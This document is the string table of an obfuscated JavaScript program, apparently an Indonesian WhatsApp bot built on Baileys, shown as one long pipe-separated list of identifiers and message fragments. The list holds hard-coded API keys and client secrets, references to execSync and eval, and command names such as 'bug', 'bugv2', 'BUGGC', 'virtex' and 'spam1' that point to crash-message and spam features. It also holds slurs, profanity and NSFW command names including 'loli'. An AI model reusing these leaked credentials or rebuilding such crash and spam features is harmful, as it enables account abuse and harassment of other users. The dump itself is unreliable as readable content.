d|_0x28c35d|_0x315c27|_0x22779f|_0x604b37|_0x2f9d76|_0x211a0a|0x83a|0xe8d4a50fff|_0x3bfd2e|_0x4fc698|_0x365a81|_0x386969|_0x5d796c|_0x2498f2|_0x31c018|_0x33338a|_0x3a77fc|_0x3c5f47|_0x17ac17|_0x2bea3e|_0x6ece19|_0x2fe0d2|_0x5509d6|_0xcf02eb|_0x5b505d|_0x31a164|_0x420d99|_0x51ca72|0x40f|_0x84b1d3|mime|_0x7c50b0|0x8e1|_0x4eca48|_0x61eb90|_0x58057e|_0xc5bb5a|0x315|0x380|_0x59478a|_0x48e872|_0x1f3306|0x993|0x273|includeStarred|x20berkata|_0x1bea9a|0x955|0x312|0x3f8|0x317|_0x2c69dd|_0x2cb917|_0x2bd918|_0x2ce146|0x1a6|0x7ca|0x4b7|_0xd67af3|_0x1cc3f0|_0x5245e4|0xaa4|0x23d|0x49c|0xa29|0x248|0x930|_0x34788c|runoy|0x647|_0x2caa89|0x4c2|0x5ee|_0x2f2a99|anune|0x19|anuitu|0x186|_0x37c8a1|0xae9|0x939|namastc|clearTimeout|0x5c8|_0xd8d445|_0x40c5e6|0x5bb|0x858|0x75a|0x888|_0x5ed4d1|_0x1e1e79|_0x50dccf|_0x2c36c6|_0x1522ac|_0x3191c1|0x74b|_0x40ff34|0x777|_0x2cb5e3|_0x578ad9|_0x4dcc35|_0x58053c|_0x58faba|_0x23cc66|0x4bd|_0xb8a2ab|0x591|0x4d0|expiredCheck|_0x482c22|_0x4bc528|_0x58f19e|0x595|0x816|getJawabanCkl|_0x389bcb|0x927|_0x113f39|0xa5e|0x5db|0x220|0x2d1|0xa5b|0x829|0xb58|0xb71|0x8f3|_0x37743b|0x68c|_0x3b9404|0x9e4|0x8c5|0xa39|0x673|0x2e5|0x3fe|0x97a|0x339|0x3b8|0x3f6|0x645|0x818|0x28f|switch|0x1bf|0xae3|0x548|_0x4561ef|0xadd|0x518|_0x3558c0|0x90b|0xf|offset|0x57f|0x280|0x537|0x1b2|0x14|song|0x30c|git|_0x31c2a7|_0x1bb15c|0x358|_0xdd2705|_0x54d7ce|_0x191746|_0x54ee6c|_0x541e94|_0x125dc6|_0x4b76af|_0x1e716e|_0x16f6c6|0x2d8|_0x1fc296|_0x571697|_0x1590b3|_0xd5f9a6|0x2f3|0x1a7|_0x2135af|_0x41f706|Script|0x69c|_0x2eb2e8|0x84f|0x484|0x6cc|0x49b|_0x3ec366|_0xa1450b|_0x456d71|_0x25c548|0x92d|_0x27385d|RESULT|x20FOUND|0x2ce|_0x16f9d9|0x966|0xa31|0x6c0|_0x1b55e8|0x7f7|_0x2a9bcd|_0x337d8c|_0x55ed81|_0x2a580a|0x869|_0x16626a|_0x291c82|0xadf|_0x1834bb|0x264|_0x5b568f|_0x26aee7|_0xe2971e|_0x4c6424|_0x302d74|0x1ba|0x771|_0x11212e|_0x6b7149|_0x264b58|_0x52ba32|_0x5294c1|0x44f|_0x52d941|_0x1986dd|_0x51f398|0x469|_0x4cfd51|_0x4173fe|_0x2117db|_0x40073c|_0x57fa43|_0x4cfa5a|0xea60|0xa8c|0x619|0xa34|0xaa5|0xa42|_0x2e7450|_0x35e096|anuk|_0x24599c|_0xe5c224|Tag|_0xa9d76f|_0x44c632|olalah|anu2|0x7c8|_0x113e51|_0x5cb0a6|_0x3c97f1|_0x2a96f8|_0x24531a|_0xff3fdb|_0x143f8b|_0x11072d|_0x5e4d0d|_0x3f6a14|lion|mascot||_0x4db394|_0x4faf25|_0x10809e|_0x541720|_0x218cc6|_0x49447f|_0x26b546|_0xa32aed|_0x20011c|_0x3868f6|_0x37dcc9|_0x1f43d9|_0x4e0459|_0x4abe08|_0x128c72|_0x76dc07|0x3d2|_0x11a29b|imag|_0x2dd212|_0x57cb51|_0x231366|_0x1f5a0a|inithumb||_0x453a4d|_0x2baf51|0x2625a00|0x92a|0xa6f|0x32c|0x82e|0x2cb|0x9a0|0x21e|0x9e7|_0x1de0e2|_0x1aa887|_0x3a7bbe|_0x57c708|_0x14966e|_0x2113eb|_0x1b29ad|_0x2ba124|_0x315d4d|_0x19daec|_0x3d0ad5|_0x338a97|_0x18b85f|_0x3112a8|_0x570fec|_0x10f2a6|0x604|setsetReply|delttt|penantang|ditantang|0x252|0x81a|0x77f|_0xa3585d|0x301|0x3b7|0x7ec|0x3be|0x9b1|0x32b|0xb61|0x1b1|0x293|0x1f4|_0x1227bf|_0x1182d6|_0x2836b9|_0x2da9d3|_0x3fed28|_0x31e246|_0x47e4b5|_0x3bb1b1|_0x4de025|_0x40c4ab|0x8a8|0xac1|_0x41a22f|_0x32a0e5|_0x4f7e13|_0x536815|0x832|0x50e|_0x136bb4|_0x4846c4|_0x49a2c7|_0x2caf84|0x8cc|_0x34a6ca|_0x2058b4|_0x5b4f98|_0x26a04d|_0x1da923|0x6a3|_0x4aadb8|0x4eb|0x3e9|0x597|0x390|0x779|0xa12|_0xf51770|kok|0x5e5|iya2|duration|_0x35c8bb|0x2ee|_0x5d7fc0|_0x4d0fe0|0x52e|_0x332939|0x85b|0x916|0x768|_0x233241|0x382|_0x160fd0|_0x469f61|Oke|0x6dc|0x87e|0x92f|_0x22f23c|0x480|_0x18b23b|_0x2e5e92|0x8cd|_0x10607b|_0x483779|_0x1520d7|_0xcc47da||0x1da|_0x53ea85|_0x584ef1|_0x140e68|_0x4fe3d4|_0x105c85|_0x4f4ae2|_0x18cd0a|_0x31e5f5|_0x5bb6b7|_0x302304|0xa47|_0x664cac|_0x59fe00|_0x4dfe38|_0x5329df|_0x5be1c2|_0x16e74d|_0x29d3db|_0x49fc39|_0x2ac7ac|_0x3c1f71|_0x1df1d8|_0x3c11cc|_0x4c91b8|_0x337265|_0x408e9c||_0x1405fd|_0x542177|_0x50ceb9|_0x522795|_0x14bf3b|_0x29573c|_0x3c9e49|0x700|_0x15a75f|_0x514963|_0x3d8315|_0x2a2452|_0x27df41|_0x61d437|_0x152aa2|_0x3c4834|_0x11ae09|0xd|_0x1b20ee|_0x27ea12|_0x1c941a|_0x5d2431|_0x2fa2ab|_0x214433|_0x459ef7|_0x3614da|_0x424098|_0x3a5062|_0x43f9bb|_0x519d02|_0x58bf50|_0x4e6125|_0x56bd21|_0xcca309|_0x36415c|_0x55b5e5|_0x57cac2|0x1a9|_0x50a108|_0x393ef0|_0x4785c1||_0x4ac4fd|_0x353d3c|0x3a8|_0x5eae8f|_0x494fcb|_0x1a4024|_0x32efa9|_0x43ac75|_0x18c5b4|_0x21f712|0xa35|_0x238e49|_0x245543|enmedia|0x311|0x773|0xb21|0x6b4|0x9e1|0xb79|0x4aa|_0x3a72a9|0xa87|0x506|0x7fa|0x9d6|0x1c2|0x1a1|0x7ee|0x926|0x810|0x453|0x9c0|0xb06|liststik|0x719|0xadb|0x885|oke|oka|0x35f|x20CHAT|0x3f1|0xa72|0x3d0|nenen|0x6a6|0x491|0x439|0xa8d|0xa1e|0x2c7|0x48b|0x976|_0x2e7b6e|_0x47a952|namaTeman|nomerTeman|_0x1eadb3|_0x40fc9c|ten|||_0x16b428|0x2b7|_0x3ca78f|_0x27bad3|0x564|0x817|_0x49fffc|_0x26b25b|_0x1351fb|_0x359872|_0x21dd80|_0xdea794|0x286|0x66c|0x9c1|_0x252693|0x44a|_0x1f0139|_0x26d576|0x5c6|igreel|_0x4aadbc|_0x19f411|_0xc0b622|_0x255b81|_0x10eefc|_0x17aec0|_0x364b9c|_0x5b635c|x20SIMI|0xa95|0x3e3|0x34d|0x70e|0x7d6|_0xdd95b|0x1f40|_0x151d79|0xab8|0x1b58|_0x410b04|0x1770|_0x305fce|0xb6f|_0x1eb3e3|_0x4595d2|0x560|0xa26|x20bersangkutan|0x9d0|_0x20e85b|_0x819d39||0x6b9|0x8ca|0xa7c|0x226|_0x2a74c2|_0x335e26|0x8a3||_0x18a1ca|_0x95f09b|_0x55c76f|_0x125a63|0x7e4|_0x128a2b|_0x19fb12|0x730|_0x15c674|_0x2b5154|_0x2fb95a|_0x4ae3c4|_0x2bafbd|ly100|_0xd1ebbc|_0x1aa630|_0x13f5c5|_0x563883|_0x134e96|_0x41c9f8|_0xf026e9|0x21d|_0x33172e|_0x58d09a|penunjuk|0x743|asi|0x4a9|petunjuk|nurulsayank|_0x13563c|_0x510a1b|_0x2501ed|_0x85c367|_0x5e6125|_0x52c21e|0xa1b|0xac0|0xac2|POST|0x863|0x3ac|0xb0d|0x528|Similarity|_0x45dd67|_0x1be6b8|_0xf1926b|Okelor|qbc|ffff|vrr|0x20f||_0x2d5781|_0x58551c|ganti|_0x1c44d3|_0xa8cbfc|0x80a|0x71f|0x206|0x385|_0x5350e5|_0x4a7dd9|lim|_0x804450|Expired|0x868|0x46a|0xb2c|0x584|emojis|_0x4a4e5f|0x456|_0x10ce55|_0x3bf4b9|_0x6a5529|_0x46c290|_0x2b48d0|_0x133671|_0x1f007c|_0x474d58|_0x4599e0|_0x5b0e58|_0x5791e3|_0x7d1354|_0x322eef|_0x3673ca|_0x351374|_0x4eef6c|_0x788ada|_0x460fa0|_0x56e80d|0xa43|0x6ee|_0xce872f|hituser|persenya|butprofile|buttonMessage|_0x359deb|Iki|_0x2a9d46|Mandarin|x20States|x20pt|x20Portuguese|_0x5d2549|tolang|_0x1c0fd3|_0x4f0d30|_0x476da9|_0x5bae41|_0x3dc3df|_0x405486|0x899|0x344||0x1bb|0x217|0x421|_0x2d5e96|_0x1384d8|awikwok|_0x52e9cb|_0x2ef031|0x39c|x20gua|_0xc51e1b|_0x34f458|_0x368a4d|_0x1a9678|_0x454c3d|sange|_0x5b1cba|gayy|_0x3c89f7|lesbii|_0x1dda16|ganteng|_0x2c4d71|cantik|_0x2a8f7e|_0x19ed07|_0x1b8291|_0x36bd88|_0x5a70ef|_0x452f98|0x47a|_0xf22573|_0x3be8bb|0x606|0xa38|_0x375142|0x6db|_0x380580|_0x3a68ab|_0x3c09e3|0x527|_0x2514d5|_0xf0ff74|_0x13916d|jadie|0xa1c|0x75b|_0x582c0a|0x403|0x5b1|0x78a|_0x155f11|_0x354d6f|_0xccd481|_0x463c5f|0x1f|0x6d9|0x77c|_0x204a21|_0x283020|0x554|_0x5436d9|_0x3f0627|0x747|_0x49949c|_0xc5304b|0x48c|kicknya|onichan|linkpp|_0x1c0cc1|_0x1fd15d|encmedian|median|encmediat|mediat|_0x546aa8|_0x52dd6e|_0x4c0713|anuu|_0xe441e1|_0xb301c3|ggs|0x374|_0xbabe25|0xa67|0x70d|_0x5576c4|0x269|0x9cc|0x4cd|0xb11|_0x4c610d|_0x2447a7|encmedia5|44500|_0x23fb58|encmedia2|_0x302a8f|encmedia4|_0x238031|mesi|_0x4d2374|ahu|_0x2bc78d|_0x180c22|_0x2a006f|yamete|_0x1207be|_0x3fdb64|_0x27491f|_0x4fbfc5|Buffer|_0x356a4c|_0xab7624|_0x10902f|_0x24e5ae|satu|dua|0x975|_0x50fc85|_0xd14a59|_0x2fb37b|_0xfb7726|dipes|bufer|desct|buu|_0x4b3359|_0x340c50|_0x5206e5|_0x45ba30|_0x51dc8d|_0xf26730|_0x43e4f9|_0x1f448a|0x5d5|0x720|Finish|_0x4c4f45|0x6fa|scale|x27min|min|force_original_aspect_ratio|decrease|x20pad|x20split|x20palettegen|reserve_transparent|transparency_color|ffffff|x20paletteuse|0x1a5|_0x198f5e|_0x25a7fc|keyrmbg|0x686|_0x28c491|_0x5cc08e|_0xfad6b3|_0x2f8fb7|0x42d|_0x21ee03|topt|_0x1b0797|qes|_0x1e5b91|_0x5845ce|_0x27e04b|_0x2dd12c|_0x33fd08|_0x3a1cbe|0x75d|_0x445efa|_0x568643|_0x5534da|x20KE|_0xfdef05|_0x510fa9|_0x5a706b|_0x4e5ae4|_0x6dcabf|0x22d|0x50b|_0x232434|_0x245fc1|_0x2ddcfc|_0x18d5e8|0x8b0|_0x1c18e5|_0x20ff0a|_0x152922|_0x3de482|_0x23c099|_0x1c0ed4|_0x5785a9|_0x376d3c|_0x20be2f|_0x55a541|0x8fb|infom|_0x17046f|_0x5240f0|_0x33c6b3|_0x5c94c6|_0x3d260d|_0x1fbdee|_0x35f029|okok|shorti|0x20e|0x1ad|_0x41dcbc|_0xc8a781|daui|0x93a|0x713|_0x20b28d|_0x598ec9|x20save|0x615|_0x39fd21|_0x1ce96|_0x219266|_0x33e7b5|_0x46ab84|_0x136fcb|_0x49e259|_0x391947|_0x476c4a|options2|_0x29ac5e|x20meminta|x20lapor|x20lengkapi|x20menanggapi|_0xde167c|qur|_0x3a3ff1|eval|_0x4a7c81|_0xf16ba9|_0x33c902|_0x1e194|0x29e|0x638|0x3f2|0x613|0x7eb|0xa6c|0x287|0xaa2|0x8ab|0x9e3|0xade|_0x15d7fb|0xaa5aa|WAConnection|_WAConnection|MessageOptions|WALocationMessage|WA_MESSAGE_STUB_TYPES|WA_DEFAULT_EPHEMERAL|WAMessageProto|ProxyAgent|waChatKey|processTime|0xb33|0xa7d|0x6b7|execSync|0x8fc|0x89d|0x718|0xb1d|getSessionId|0xa50|0x5b4|0xa2d|mathjs|0x326|0xa2c|0x847|0x8e6|toMs|0x8d3|qrkode|0x82c|0x5da|0x553|0x5af|0x6bf|0x39d|0x8c0|0x827|host|west|access_key|0xaf2|access_secret|PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR|0x942|0x320|0x529|clientId|acc6302297e040aeb6e4ac1fbdfd62c3|clientSecret|0xb6b|youtubeSearch|mediafiredl|lyricsv2|tiktokdl|tiktokdlv2|twitterdl|twitterdlv2|getZodiac|liputan6|googleIt|0x451|0x8f4|0x9d5|0x8ba|overwrite|0x85f|makeid|calculate_age|generateMessageTag|jsonformat|generateProfilePicture|generateMessageID|banner|info|functions|bgcolor|0xad8|0x7e3|getBase64|0xb64|styleText|baseURI|buffer2Stream|stream2Buffer|ythd|0x89c|0x399|0x79f|0x709|0x79b|unSpam|0x2be|uptotele|uploadImages|uploadimage|TelegraPh|UploadFileUgu|uploader|0xad5|0x1be|0xa79|0x214|0x56d|0x4be|0x2d3|getDataId|0x821|wikimedia|quotesAnime|0x55a|katasore|0x6bc|0x19e|commands|0x828|0x846|cekBlock|blockuser|deleteError|0x563|0x237|virtag|emoji1|emoji2|0x938|0x3b4|0x29b|bancht|0x7cb|0x393|0xac7|spam1|0x6fb|0x39f|0x2a2|girl|fakethumbnail|global|0x41e|0x38d|0x4f7|0x76d|0x195|0x319|0x502|0x63c|0x448|0x831|0xaac|tebakkimia|0x1e1|0xad0|0x9d3|0xa40|0x6c1|0x5f2|0xa82|0x1a3|0x8f2|0x549|setMenu|0xb53|0xaab|1632578387|0x889|IDR|Suit|x20dikirimkan|x20beruntung|Chat|x0aArtists|x20mendownload|x20musik|13344562XmQasw|ceklimit|setbiobot|x20DELETE|cari|soalImg|loadAllMessages|390|setppgc|listcmd|c9f2fca5e16a7986b0a6c8ff70ed0a06|x20Detected|glass|delttc|x20SoundCloud_|Ajg|readall|nsfwmenu|9999999|setprefix|x20Rp750|sewalist|colong|blush|mmek|x20Respon|tagmember|x20cmdnya|x0amenyalahgunakan|nilai_2|stories|brazzers|x0aSuhu|x20AAAAA|x20LUCCUUUUUUUUUUUUUUU|juga|x20List|x20Harga|x20750|x2050|wasted|Kalau|x20kalau|luar|x20sahabat|boleh|x20beda|sma|erima|adiwajshing|baileys|Wah|x20Mantap|x0aPasti|x20Nya|x20Kuli|x0aAwowkwokwwok|CandabOs|x22volume|hidetag|sendkontak|x20judul|HEAD|15575|12097272_1193895144391295_8973688483514349023_n|5a9d7147627a8355569f1a641b9ebee3|60C65E73|infogrup|x20after|x20becomes|x20hooman|Cari|x20Aja|x20jawbab|Makasih|x20profil|x20barunya|bugv2|Jayapura|Nyanyi|getTGPosi|bug1|x20ftext|imgtourl|934|Haha|x20mna|x20nsfw|x20ECONNABORTED|Wiki|Orang|x20bersama|x20Used|setcmd|0e8439a1280a43aba9a5bc0a16f3f009|ekprefix|x20sizenya|Menggambar|getMtkPosi|Bajingan|x20CAK|x20LONTONG|isMtk|canonicalUrl|Hayuk|setppbot|x20cinta|x20bertepuk|x20sebelah|x20tangan|x20rasanya|x20gimana|x20brou|x20Terjadi|x20kesalahan|x20beberapa|kalkulator|The|x20invalid|JUJkLCf4mRF0oBuAlwEhO6|AUDIO|linkgroup|setovo|setReply|magnitude|clear|exports|feed|x0aSyarat|x20Ketentuan|kiss|x20R|x20U|x20P|x20F|Name|x0aAngin|x20dibuat|Sending|x20Menemukan|x20total|AntiBadword|social_sharing|x20Hati|x20besok|tomp4|form|type1|setbotname|ssweb|x20SEARCH|userlist|x20TYPING|Asu|fast|lastIndexOf|x0aUser|x20Simbol|x20e|x20disupport|snap|post|crush|x20Humidity|antitoxic|modStick|holo|totag|hug|banchat|bcot|opentime|greyscale|searchMessages|unbanchat|smug|Harus|event|redple|closetime|listban|dada|x20Wind|storyanime|rejected|answer|x20At|getTKPosi|x20wibu|Wuih|Sosmedtan|ttp2|listgc|blackpink|1001|Astagfirloh|x20oni|x20chan|whatmusic|x0aBio|ninamess|infogc|x20Spotify|bendera|x20Dicari|listpremium|units|metric|appid|060a6bcfa19809c2cd4d97a212b19273|apikey|GSdohIiH|x20membuatmu|reason|Cuaca|x20Otw|daftarerror|x20Suit|x20dashboard|husbu|833|Successfully|x20Entered|cry|suit_|twmp4|inputFormat|soundcloudsearch|days|APIKEY|MIMINETBOT|openweathermap|org|delalluser|936|kirin|ramalanrejeki|Taek|3000years|ualaikum|84413lIjQHW|BISA|shinobu|Received|x20virus|aku|x20diem|peluk|nekos|life|img|Developer|ttpblue|album_name|officialdittaz|setMaxListeners|762191dYPREQ|x20memblokir|audiotourl|davizinmaker|x20thumbnail|Kenapa|65100|tomp3|Kode|x20bahasanya|ero|STICKER|kontag|x20mukamu|x20temanmu|x20ketemu|Close|x20merasa|out|x20KICKAREA|x0aketik|x20devote|Huruf|x20kecil|x0avote|x0adevote|x0aAlasan|jadwaltvnow|longitude|Pler|getJawabanTL|x20Weather|x20note|x20baby|views|ago|x20publick|x20Artist|nLEYHaaB6x0|x20membaca|x20Lokasi|groupMakeAdmin|pat|slap|joypixel|messageInfo|nobg|x20YANG|x20TERSEDIA|NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE|MTFbH|Wk8|getTLPosi|soundcloud|x20infobotz|x20ditutup|namapasangan|x20ANTV|depth|x0aTerimakasih|x20atas|x0ayang|x20berikan|x0amemperbaiki|x0asecepat|x20fix|x0aKami|x20mengupload|x0aSelalu|x20Repository|x20kami|x20update|x20terbaru|x20entar|x20Sinyalnya|Kontol|dellstik|wave|smsg|repos|deepfry|sort|bullyuk|Kontak|x20tersimpan|frame|grabbed|results|master|2020|txt|messageStubType|bonk|glomp|lookwhatkarenhave|prefix|x20TicTacToe|x20Y|x20ANDA|x20TELAH|awesome|phonenumber|Lonte|mama|nowm|x20setReply|Pesan|Pernah|x20lama|pressure|pukulin|logitech|jncok|At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P|hZIVPLsI70nM|x20lahir|x20fotomu|x20pungut|x20special|x20get|x20access|KICK|bucin|STATUS|scsearch|x0aTipe|wanted|anoncybfakeplayer|CZCA|viBoxa|879|cekpremium|x0aTempat|Ingfonya|x20baris|9999|kodebahasa|x20Waktu|getJawabanTG|x0aPangkatmu|x20Cari|x20Apa|waifunime|Bilang|x22KAMU|x20CANTIK|x20BANGET|x20BOHONG|x20cowo|mp4Audio|mulai|Saldo|x20pembelian|x20Dari|x20selat|x20datang|x0aKlik|x20dibawah|x20memcari|x20partner|ttp3|imagetorul|clearallgc|ydkskyshj755hfuej|totalpesan|x20seneng|x20sedih|Engga|x20engga|Antiasing|Rahasia|phaticusthiccy|apis|x20Request|x20failed|x20with|x20code|x20telebih|x20dahulu|x20fake|yeet|toimg|Title|x20desc|Bcot|Cacat|x20Gagal|x20Mendownload|x20Dan|x20Media_|x20ngewe|x20kemarin|x20grub|x20MENU|Katalog|Pptx|Xlsx|Zip|Pdf|Docx|clearallblock|kocok|Bacot|megumin|Menurut|x20Kbbi|x20siang|ckl|Sedang|x20mencari|presences|x20Lord|setPrefix|x0aLongitude|x20provide|x20place|x20location|x20882|9202|4190|getJawabanTA|happy|cekWaktuMtk|x20Virtex|x20Minimum|x20menyantet|x20begadang|x20Tar|x20loh|diteruskan|x20diaktifkan|x20liat|waduh|x20Babi|x20selingkuhan|Tai|artiNama|x20nonaktif|buygamelimit|x0aID|3QoJOho|x20bro|gebukin|zin|Footer|x0aMohon|x0aFile|restart|addstatus|sticker21|Following|x20alami|taek|Maukin|x20goblok|x20Dibawah|x20Menghentikan|Pagi|Bjingan|x20ENOENT|x20such|x20directory|harus|x20Mu|x20Ternyata|x20Cemrai|x0aSedih|x20Gua|x20Liatnya|x0aTapi|x20Nih|x20Tapi|x0aTetep|x20Ae|x20Aowkwowkw|x20Ngakak|x20System|x20pastikan|glitch3|laporbug|Ram|x20lanjut|Penyayang|x20_LINK|x20WA_|x20jadian|x20kumpulkan|x20beli|trap|x20eror|Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8|YPQMMb1N1y|cariteman|followers|x20UP|x20naik|x20PREMIUM|Rp10|x20capion|futanari|x20ERROR|comrade|ttpyellow|sticker11|x20Activated|x20sehari|x20sekali|nomerlu|listResponseMessage|Alasanya|more|latitude|bochilteam|kicktime|setimagereply|top4top|m_2213dvvcg0|x20Profile|cute|tospam|toUpperCase|x0asekarang|clearbadword|x20fotoan|Stop|Voting|x20berhenti|x20Anonymus|ttppink|Multi|lolice|x20Aktif|addbadword|CLOSE|leaves|931|x20AUDIO|groupLeave|bcpc|Jadwal|x20Tv|x20Now|x202|ngewe|headers|delcmd|x20berak|Asw|yerah|setfakeimg|Succses|x20Targetnya|x20due|x20an|recording|jadivirgam|x20linkgc|x2060s|x20result|x20Clear|record|x20surah|x20al|kautsar|Bio|cantikcek|archive|refs|heads|cekWaktuTG|errorlist|tts|x20Whatsapp|x0ahttps|x20Hubungi|x20Nanti|tanggaljadian|setimgenfo|x20Online|repeat|stiker|x20addprem|groupinfo|Ilham|artwork_url|ttt|full_name|balasanbot|x0aEx|semoji|x20Views|Next|x20viewonce|6289530863358|1621036495|clearallbanned|eron|Enggaklah|Jodoh|x20Jawaban|feet|x20BUGGC|x0aExpire|x20forwardnya|x20100|x20100000|tik|tok|983|x20dana|EXTREAM|Nanya|x20Terus|listrespon|x20CALL|setbio|Sesi|x20Berlangsung|x20Anime|x0aLatitude|x20nyuri|x20uang|x20nyokap|x20bokap|x20Alesanya|_Succses|x20Join|sticker09|Modar|setimagedoc|Ditemukan|Lnte|x20Tanggalny|ps4|artimimpi|addmtk|ORG|_Siapa|x0aTag|x20orangnya|pake|x20sule|x20sampe|delsewa|infoall|x20QUOTED|Please|x20Wait|x20kebanyakan|episode|spotifydl|8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI|x20dibuka|x20Format|cekWaktuFam|lnte|self|setdesc|listuser|autoclearchat|x20deactibated|x20Uang|Err|space|985|Antivirtex|setQuoted|x20malem|artinama|x20gempa|x20VIEW|x20ONCE|1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b|shorturl|7119|35160407_568282564396101_3119299043264875885_n|d43befa9a76b69d757877c3d430a0752|61915CEC|groupAdd|ajg|totalerror|gay|x20Mati|beban|x20defined|pesannya|CATALOG|x20aaaaaah|x20YEAAAAAAAAAAAH|x20MASIH|x20PUNYA|sebutkan|x20denya|temp_min|x20pertama|x20manis|x20banget|AntiViewOnce|You|x20have|x20made|x20before|x20Please|x20at|x20hours|x20sore|eroyuri|addsyiko|x20Setelah|x20has|x20run|x20out|x20type|x20aaaah|x20baunya|x20rambut|x20Senku|6285842369183|x20Maap|x20melebihi|x20batas|x20permintaan|delallerror|deleteMessage|Aduh|emojinya|UwU|Deskripsi|x20Orang|groupSettingChange|Sama|x20Phone|is_verified|gcount|x20emot|x20setiap|x20ngetik|60000|clearalluser|51710311459|3AxVxRS0bOfDTv2X|3A23|gaycek|suhu|x20KATA|x20demote|ttp2yellow|x20Deactivated|cuddle|x20UnBan|facebook|PRIVATE|round|waktu_milih|x20New|pcallmember|ttpgreen|Started|cekWaktuTB|kelembapan|amethyste|isTebakKata|reads|ddungeon|x20api|x20linkya|Selesaikan|bug|isAdmin|cover_url|Followers|Verified|setWelcome|Anjing|aukddi|generateLinkPreview|playmusic|stickmeme|x20terima|tolak|x20Bisa|x20restarting|x20BROADCAST|bugv4|selectedButtonId|kocakz|fancytext|snippet|x20berpengaruh|x20kepada|x20kehidupanmu|1202492eIMniv|zipball|x20ditakutin|some|canvas|Mmek|x20Artis|x20SETTING|caridoi|setnamegc|setwelcome|annotate|ttp2green|x20wawan|x20activated|dcode|denpa|2607196lUfMNk|bully|dare|x20Maximum|jumlahnya|That|santet|coeg|addckl|Url|x20undefined|Joined|Memek|fbdl|groupAdmins|thanos|x20asek|x20euy|x20Diputar|kntl|diem|telfon|pacar|devote|glimit|Memasak|isTebakLirik|dellrespon|x20chatbot|heapUsed|Bjirr|x20keknya|x20membanggakan|x20dapatkan|x20tahun|wind|x20SetReply|x20fkontak|x20katalog|Gua|x20tabok|auto|triggered|tes|getfamposi|x20Wkwkwk|x20YUxdev|prank|x20love|x20pgn|x20balikan|874|Skip|googleimage|quote|x20cocok|country|substring|IMAGE|x20subuh|pcallmem|x20mending|unadmin|Video|x20selesaikan|OPEN|x20mengakses|performance|readmore|bugv1|lokasi|sharpen|imagemagick|x20Genres|x20gagal|listonline|x0aRelease|greenneon|1028|x20Karena|x20Private|twitterhd|DOCUMENT|960x1280|Jancok|messenger|delallban|demote|unblockcmd|x20EMOJI|x20ap|x20Apple|x20go|x20Google|x20sa|x20Samsung|x20ms|x20Microsoft|x20WhatsApp|x20tw|x20Twitter|x20fb|x20Facebook|x20jp|x20JoyPixels|x20op|x20OpenMoji|x20od|x20emojidex|x20mes|x20Messenger|x20lg|x20logitech|x20htc|x20HTC|x20mo|x20Mozilla|x20sb|x20SoftBank|x20dm|x20Docomo|x20au|x20auKDDI|x0apenggunaan|infogempa|x20tagsticker|mtype|getppgc|x20wuuuuuuuuuuu|getPremiumExpired|suitpvp|apple|stickerPack|insta_reel|Hah|statuson|x20Paijo|glitch2|Invalid|x20phone|x20number|Aowkwwo|x0aLu|x20Awowkwowk|x0aSabar|Camda|pixelize|next|x0a_yo|x20yo|x20ramein_|Telah|x20Dibaca|x20Oleh|fluent|BRAINLY|debug|6289643739077|1613049930|judul|x20TOP|x20BALANCE|greenyellow|Query|x20sambil|x20mahgrip|les|Nobar|katsu|x20VIDEO|downloadTrack|baka|x20tersedia|x20very_easy|x20medium|x20hard|x20extreme|x20impossible|x0a_Example|handhold|setppgrup|katalog|videoanime|Z3nA2asclAAwWHngNO|vJ81qxOE2|0gkEnXak|NxPV4|clearall1|download|buypremium|videoDetails|Urlnya|reverse|ttpviolet|igdown|x2001|07|togif|giftlimit|text2|getName|x0aVERSION|x0aN|ttpmagenta|src|x0adaftar|notoken|delror|1W0XhfaAcDwc7xh1R8lca6Qg|1bB4naFCSngM2LKO2NoP5RI7K|zLw|x0aAlbum|Pilih|x20setwelcome|x20type1|x20type2|x20type3|x20ovo|impressive|effects|1027|x20gaes|x0aBaterai|term|silit|x20kick2|x20teh|x20macan|x20usah|docomo|872|x20OFFLINE|smile|infogroup|x20freeoneday|autoreport|Speed|9Gs2qT31Ensb4gEmxw5p28JA|clearall|action|bgi|x20muslim|x20solat|x20seharian|dodo|tesom|x20pdf|Free|x20change|x0aSERI|githubdl|jail|x27alaikum|x20Bio|x20EXPLANATION|x20wkwkw|Soalnya|kemonomimi|playback_count|addSewaGroup|loli|shot|screenshotapi|bite|x20EXPIRE|_Waktu|x20habis_|x20Harap|bismilah|sticker03|x20masing|x0aklik|x20Ziudith|warning|hxz|Terjadi|x20Tolong|Youtube|x20Search|base64img|20CSvAnU|addtebaklirik|awoo|waiting|x20compress|x20zip|Pemurah|tupai|INQUIRY|x20Date|match|rotate|Bye|slow|imut|Aktifkan|addcmd|balance|pencapaian|x20didapet|x20ditahun|leave|isCkl|sayang|large|x20daerah|setthumb|totalcmd|ttp2red|jimp|sewacek|x20vnnya|Sebutkan|x20kejadian|x20hati|x20inget|kecocokannama|All|toggleDisappearingMessages|distort|x20mencret|x20paku|setimgdoc|entries|Arya|was|endak|tau|olak|bugreport|x20in|x20ngantuk|x20tidur|x20dulu|x20Drakor|x20LIRIK|sticker13|x20mengkonversi|x20ptt|x20Sticker|Image|orange|lesbicek|x20PREFIX|x20masukkan|x0aOptions|x20multi|x20nopref|x20allpref|x0aMenunggu|ttp|kontol|stikertourl|bilang|x20pacarku|x20bgt|serah|tele|x20drop|Low|x20similarity|wink|Silet|evaluate|toptt|x20Botz|x20mengeluarkan|x20terdetaksi|whatanime|x20Mulu|x20Broo|x0aKasian|x0aNtar|x20Tersinggung|x20Kan|x0aYahahaha|x20Hayyuk|x20By|x20Ramlan|x0aCommand|cacat|ttp2purple|END|listvn|1633160194|40151a65238ba2643152d|gitclone|fire|x20kasih|x20peak|x20anjimm|x20gabutt|x20anjimmm|x20depan|x20rumah|x20perbedaanya|lick|sangecek|listsewa|XWv4hcnpGY51qEVSO9|q6LYqPR3DbtT4iqS9yKhkI|Jadikan|x20Sebagai|ramalanjodoh|1494mtrARU|sider|watakartis|x20offline|solo|situs|3dspace|CZ2bMRkgHCR|x20STICKER|x0aPeringatan|cosplay|harilarangan|dictator|tovideo|milf|memegen|custom|terminal|x2012|x20Dzuhur|x20mabar|x20bareng|sama|mememteeeekkeke|delblock|holographic|975|bjingan|bu